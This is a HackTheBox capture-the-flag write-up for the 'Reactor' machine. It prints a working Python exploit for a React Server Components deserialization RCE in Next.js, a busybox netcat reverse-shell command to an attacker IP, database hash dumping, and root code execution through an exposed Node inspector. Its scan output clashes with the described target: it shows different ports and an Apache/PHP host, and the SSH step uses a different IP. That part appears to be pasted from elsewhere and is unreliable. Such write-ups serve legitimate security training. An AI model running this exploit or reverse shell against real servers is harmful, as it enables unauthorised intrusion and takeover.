---
title: HTB · Reactor
slug: htb-reactor
date: 2026-08-07
image: reactor
platform: HackTheBox
os: Linux
difficulty: Easy
points: 585
tags: [hackthebox, linux, easy, active, cve-2025-55182, reverse-shell, node.js, sqlite3]
description: Reactor is an easy-rated Linux machine running a Next.js application vulnerable to unauthenticated RCE via a React Server Components deserialization flaw (CVE-2025-55182).
featured: true
---

# Reconnaissance
## Staged Nmap Scanning
```bash
nmap -p- --min-rate 10000 10.129.245.214
nmap -p 22,3000 -sCV 10.129.245.214
```
### Initial Scan Results
```bash
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
| http-title: 404 Not Found
|_Requested resource was config.php
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
| http-robots.txt: 1 disallowed entry 
|_/
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_ssl-date: TLS randomness does not represent time
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
```
## Hosts File
The website uses a virtual host. I'll add it to `/etc/hosts`:
```bash
echo "10.129.245.214 reactor.htb" | sudo tee -a /etc/hosts
```
---
# Exploitation
**Vulnerability: CVE-2025-55182 (React2Shell)**
The version of Next.js running (15.0.3) is vulnerable to a prototype pollution and unsafe deserialization attack in the React Server Components handler, commonly referred to as **React2Shell**. This vulnerability allows an unauthenticated attacker to inject a malicious payload into the `Next-Action` header.
I'll set up a listener first:
```bash
nc -lvnp 4001
```
The exploit abuses internal React Flight processing behavior to trigger arbitrary JavaScript execution inside the Node.js runtime.
```python
import requests, sys, json

BASE_URL = sys.argv[1]
EXECUTABLE = sys.argv[2]

crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
        "_formData": {"get": "$1:constructor:constructor"},
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"')
}

headers = {"Next-Action": "x"}

requests.post(BASE_URL, files=files, headers=headers)
```
I'll trigger the Remote Code Execution now with this command.
```bash
python3 exploit.py http://10.129.245.214 "busybox nc 10.10.17.36 4001 -e /bin/sh"
```
And now we got a shell as `node@reactor`.

---
# Post Exploitation
With shell access as `node`, local enumeration becomes the next priority.
Inside the application directory, an SQLite database stands out:
`/opt/reactor-app/reactor.db`
Querying the database reveals stored application users:
```bash
sqlite3 /opt/reactor-app/reactor.db "SELECT * FROM users;"
```
The output contains password hashes for multiple users, including `engineer`.
Let's crack the password with john.
After recovering the `engineer` password, SSH access becomes possible:
### Lateral Movement
```bash
ssh engineer@10.129.1.31
```
And now we can print out the user.txt flag.
```bash
cat /home/engineer/user.txt
```
---
# Privilege Escalation
Running process enumeration quickly exposes something unusual:
```bash
ps aux | grep node
```
One Node.js process is running with debugging enabled:
```bash
/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```
The Node inspector interface allows remote debugging of live Node.js processes. If accessible locally, it effectively provides JavaScript execution inside the target process.

Since the service runs as root, this becomes a direct privilege escalation vector.
### Connecting to the Debugger
```bash
node inspect 127.0.0.1:9229
```
Once connected, arbitrary JavaScript can be evaluated.
And now we can get the root flag like so:
```js
exec("process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()")
```